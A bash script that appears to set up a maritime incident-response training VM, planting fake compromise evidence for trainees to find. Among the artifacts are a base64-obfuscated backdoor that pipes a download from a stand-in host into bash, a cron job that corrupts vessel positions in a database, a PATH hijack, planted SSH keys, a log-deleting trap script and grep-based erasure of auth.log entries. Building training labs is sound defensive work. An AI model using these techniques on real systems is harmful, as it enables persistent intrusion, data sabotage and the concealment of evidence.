#!/bin/bash

# Advanced setup script for vm-coretech
# Extends basic setup with realistic services and compromise evidence

echo "[+] Starting advanced coretech setup..."

# CLEANUP SECTION - Remove any previous setup artifacts
echo "[+] Cleaning up any previous setup artifacts..."

# Remove directories
rm -rf /opt/ais-tracker /opt/container-scheduler /opt/vessel-manager
rm -rf /var/log/ais /var/log/container /var/log/vessel /var/log/sim
rm -rf /etc/ais-tracker /etc/container-scheduler
rm -rf /tmp/.python_cache /tmp/.bin /opt/maintenance /opt/reference
rm -rf /.cache/.system

# Remove specific files
rm -f /root/.mysql_history
rm -f /home/ubuntu/restore_feed.sh
rm -f /opt/vessel-manager/position-sync.sh

# Remove systemd service files
rm -f /etc/systemd/system/ais-tracker.service
rm -f /etc/systemd/system/container-scheduler.service

# Remove cron jobs
rm -f /etc/cron.d/ais-maintenance
rm -f /etc/cron.d/log-truncate

# Remove user directories (if they exist)
userdel -r svc_scheduler 2>/dev/null || true
userdel -r svc_ais 2>/dev/null || true
userdel -r svc_cctv 2>/dev/null || true
userdel -r svc_crane 2>/dev/null || true

# Clean up auth.log entries from previous runs
# Keep original auth.log but remove our injected entries
if [ -f /var/log/auth.log ]; then
    grep -v "svc_scheduler\|svc_ais\|198.51.100.17\|vendor_api" /var/log/auth.log > /var/log/auth.log.clean
    mv /var/log/auth.log.clean /var/log/auth.log
fi

# Clean up syslog entries
if [ -f /var/log/syslog ]; then
    grep -v "gateway-router\|vendor-portal" /var/log/syslog > /var/log/syslog.clean
    mv /var/log/syslog.clean /var/log/syslog
fi

# Remove from environment
sed -i '/PATH="\/tmp\/.bin/d' /etc/environment 2>/dev/null || true

echo "[+] Cleanup complete. Starting fresh setup..."
echo ""

# Create system directories
mkdir -p /opt/ais-tracker /opt/container-scheduler /opt/vessel-manager
mkdir -p /var/log/{ais,container,vessel,sim} /etc/ais-tracker /etc/container-scheduler
mkdir -p /tmp/.python_cache /tmp/.bin /opt/maintenance /opt/reference

# Setup mock services configurations
echo "[+] Setting up core operational services..."

# AIS Tracker configuration
cat > /etc/ais-tracker/config.conf << 'EOF'
# AIS Tracking System Configuration
# Last modified: 2024-06-20 09:42:00 by svc_ais
[main]
update_interval = 30
position_offset_lat = 0.0001  # Modified from 0.0000
position_offset_lon = -0.0002  # Modified from 0.0000
data_source = mqtt://localhost:1883/vessels/+/position

[vessels]
track_all = true
alert_on_missing = true
EOF

# Original config backup showing tampering
cat > /etc/ais-tracker/config.conf.bak << 'EOF'
# AIS Tracking System Configuration
[main]
update_interval = 30
position_offset_lat = 0.0000
position_offset_lon = 0.0000
data_source = mqtt://localhost:1883/vessels/+/position

[vessels]
track_all = true
alert_on_missing = true
EOF

# Container scheduler configuration with routing manipulation
cat > /etc/container-scheduler/routes.conf << 'EOF'
# Container Routing Rules
# CRITICAL: Manual override added 2024-06-20 09:48
[routing]
default_berth = 3
override_CON44891 = 7  # Diverted by maintenance script
override_CON44902 = 7  # Diverted by maintenance script

[rules]
priority_prefixes = CON5,CON6
load_balancing = enabled
EOF

# Create systemd service files
cat > /etc/systemd/system/ais-tracker.service << 'EOF'
[Unit]
Description=AIS Vessel Tracking Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /opt/ais-tracker/tracker.py
Restart=always
User=svc_ais

[Install]
WantedBy=multi-user.target
EOF

cat > /etc/systemd/system/container-scheduler.service << 'EOF'
[Unit]
Description=Container Routing Scheduler
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /opt/container-scheduler/scheduler.py
Restart=always
User=svc_scheduler

[Install]
WantedBy=multi-user.target
EOF

# Create mock service scripts
cat > /opt/ais-tracker/tracker.py << 'EOF'
#!/usr/bin/env python3
# AIS Tracking Service
import time
while True:
    time.sleep(60)
EOF
chmod +x /opt/ais-tracker/tracker.py

cat > /opt/container-scheduler/scheduler.py << 'EOF'
#!/usr/bin/env python3
# Container Scheduling Service
import time
while True:
    time.sleep(60)
EOF
chmod +x /opt/container-scheduler/scheduler.py

# COMPROMISE EVIDENCE

echo "[+] Planting operational manipulation evidence..."

# MySQL history showing data tampering
cat > /root/.mysql_history << 'EOF'
use vessel_tracking;
show tables;
select * from vessel_positions limit 10;
select * from vessel_positions where vessel_name='Ship_Alpha';
update vessel_positions set latitude=latitude+0.0001, longitude=longitude-0.0002 where active=1;
update vessel_positions set last_seen='2024-06-20 09:05:00' where vessel_name='Ship_Alpha';
update vessel_positions set visible=0 where vessel_name='Ship_Alpha';
select * from vessel_positions where visible=0;
EOF

# Container routing manipulation logs
cat >> /var/log/container/scheduler.log << 'EOF'
2024-06-20 09:48:00 INFO: Container routing service started
2024-06-20 09:48:30 INFO: Loading routing rules from /etc/container-scheduler/routes.conf
2024-06-20 09:48:31 WARNING: Manual override detected for CON44891 -> Berth 7
2024-06-20 09:48:31 WARNING: Manual override detected for CON44902 -> Berth 7
2024-06-20 09:50:00 ERROR: Container CON44891 routed to Berth 7 (expected: Berth 3)
2024-06-20 09:50:15 ERROR: Container CON44902 routed to Berth 7 (expected: Berth 3)
2024-06-20 09:50:16 INFO: Client notification sent for misrouted containers
EOF

# Add reference files as documented
cat > /opt/reference/ais_reference.log << 'EOF'
Reference AIS data hash: a1b2c3d4e5f6789
Last verified: 2024-06-20 08:00:00
Status: CORRUPTED - position offsets detected
EOF

# Add AIS feed log as documented
cat > /var/log/sim/ais_feed.log << 'EOF'
2024-06-20 08:45:00 INFO: AIS feed started
2024-06-20 09:05:00 WARNING: Ship_Alpha position drift detected
2024-06-20 09:05:01 ERROR: GPS data inconsistency for Ship_Alpha
2024-06-20 09:10:00 WARNING: Ship_Bravo intermittent signal
2024-06-20 09:40:00 ERROR: Multiple vessel positions corrupted
2024-06-20 09:40:01 CRITICAL: AIS system compromise suspected
EOF

# Service account authentication failures (T+40 inject)
cat >> /var/log/auth.log << 'EOF'
Jun 21 09:40:00 vm-coretech sshd[6234]: Failed password for svc_scheduler from 10.0.0.2 port 45234 ssh2
Jun 20 09:40:01 vm-coretech sshd[6234]: Failed password for svc_scheduler from 10.0.0.2 port 45234 ssh2
Jun 20 09:40:02 vm-coretech sshd[6234]: Failed password for svc_scheduler from 10.0.0.2 port 45234 ssh2
Jun 20 09:40:03 vm-coretech su[6235]: FAILED su for svc_ais by root
Jun 20 09:40:03 vm-coretech su[6235]: - pts/0 root:svc_ais
Jun 20 09:40:15 vm-coretech sshd[6240]: Failed password for svc_ais from 10.0.0.3 port 45240 ssh2
Jun 20 09:40:20 vm-coretech systemd[1]: ais-tracker.service: Main process exited, code=exited, status=1/FAILURE
Jun 20 09:40:20 vm-coretech systemd[1]: ais-tracker.service: Failed with result 'exit-code'.
EOF

# Hidden backdoor script
cat > /tmp/.python_cache/updater.py << 'EOF'
#!/usr/bin/env python3
import subprocess
import base64
import time

def update_config():
    # Persistence mechanism
    cmd = base64.b64decode("Y3VybCAtcyBodHRwOi8vMTk4LjUxLjEwMC4xNy9jb25maWcgfCBiYXNo").decode()
    subprocess.run(cmd, shell=True, capture_output=True)

if __name__ == "__main__":
    while True:
        update_config()
        time.sleep(300)
EOF
chmod +x /tmp/.python_cache/updater.py

# Malicious cron job affecting AIS data
cat > /etc/cron.d/ais-maintenance << 'EOF'
# AIS position synchronization
*/5 * * * * svc_ais /usr/bin/python3 -c "import mysql.connector; db=mysql.connector.connect(host='localhost',user='ais',password='ais123',database='vessel_tracking'); cur=db.cursor(); cur.execute('UPDATE vessel_positions SET latitude=latitude+0.0001 WHERE vessel_name LIKE \"Ship_%\"'); db.commit()" 2>/dev/null
EOF

# Modified PATH
echo 'PATH="/tmp/.bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"' >> /etc/environment

# Create service users if they don't exist
useradd -m -s /bin/bash svc_scheduler 2>/dev/null || true
useradd -m -s /bin/bash svc_ais 2>/dev/null || true

# Lateral movement artifacts - SSH keys from gateway
mkdir -p /home/svc_scheduler/.ssh /home/svc_ais/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7VN+4u6L6p7Lz+h8Km5Y6f8dZ9P3e4xz5 compromised@gateway" > /home/svc_scheduler/.ssh/authorized_keys
cp /home/svc_scheduler/.ssh/authorized_keys /home/svc_ais/.ssh/

# Bash history showing system reconnaissance
cat > /home/svc_scheduler/.bash_history << 'EOF'
systemctl status container-scheduler
cat /etc/container-scheduler/routes.conf
vi /etc/container-scheduler/routes.conf
mysql -u scheduler -p
systemctl restart container-scheduler
ps aux | grep container
netstat -tlpn
EOF

# Evidence of AIS system investigation
cat > /home/svc_ais/.bash_history << 'EOF'
systemctl status ais-tracker
tail -f /var/log/ais/tracker.log
mysql -u ais -p vessel_tracking
mosquitto_sub -t vessels/+/position
cat /etc/ais-tracker/config.conf
cp /etc/ais-tracker/config.conf /etc/ais-tracker/config.conf.bak
vi /etc/ais-tracker/config.conf
systemctl restart ais-tracker
EOF

# MQTT broker logs showing anomalous messages
mkdir -p /var/log/mosquitto
cat >> /var/log/mosquitto/mosquitto.log << 'EOF'
1718870400: New connection from 10.0.0.2 on port 1883.
1718870400: New client connected from 10.0.0.2 as gateway-monitor (c1, k60).
1718870520: Client gateway-monitor disconnected.
1718870580: New connection from 198.51.100.17 on port 1883.
1718870580: New client connected from 198.51.100.17 as external-sync (c1, k60).
1718870581: Received PUBLISH from external-sync (d0, q0, r0, m0, 'vessels/Ship_Alpha/position', ... (45 bytes))
1718870581: Received PUBLISH from external-sync (d0, q0, r0, m0, 'vessels/Ship_Alpha/visible', ... (5 bytes))
EOF

# Create the trap restoration script as documented
cat > /home/ubuntu/restore_feed.sh << 'EOF'
#!/bin/bash
# AIS Feed Restoration Script
# DO NOT RUN - This is a trap that will make things worse!
echo "Restoring AIS feed to normal operation..."
sleep 2
echo "Clearing corrupted cache..."
rm -rf /var/log/sim/*
echo "Resetting configuration..."
echo "position_offset_lat = 0.5000" >> /etc/ais-tracker/config.conf
echo "position_offset_lon = -0.5000" >> /etc/ais-tracker/config.conf
echo "ERROR: Feed corruption detected. Manual intervention required."
exit 1
EOF
chmod +x /home/ubuntu/restore_feed.sh
chown ubuntu:ubuntu /home/ubuntu/restore_feed.sh

# Suspicious process that appears legitimate
cat > /opt/vessel-manager/position-sync.sh << 'EOF'
#!/bin/bash
# Vessel Position Synchronization
# Added by maintenance team 2024-06-20
while true; do
    # Sync positions with external source
    curl -s http://198.51.100.17/positions | python3 -c "
import sys, json
data = json.load(sys.stdin)
# Process position updates
"
    sleep 300
done
EOF
chmod +x /opt/vessel-manager/position-sync.sh

# Set appropriate permissions
chown -R svc_scheduler:svc_scheduler /home/svc_scheduler 2>/dev/null || true
chown -R svc_ais:svc_ais /home/svc_ais 2>/dev/null || true
chmod 600 /home/*/.ssh/authorized_keys 2>/dev/null || true
chmod 755 /tmp/.python_cache

echo "[+] Advanced coretech setup complete!"
echo "[!] Operational manipulation evidence planted:"
echo "    - AIS config tampering in /etc/ais-tracker/"
echo "    - Container routing overrides in /etc/container-scheduler/"
echo "    - MySQL tampering history in /root/.mysql_history"
echo "    - Service account failures in auth.log"
echo "    - Hidden backdoor in /tmp/.python_cache/"
echo "    - Malicious cron job in /etc/cron.d/ais-maintenance"
echo "    - Container misrouting logs in /var/log/container/"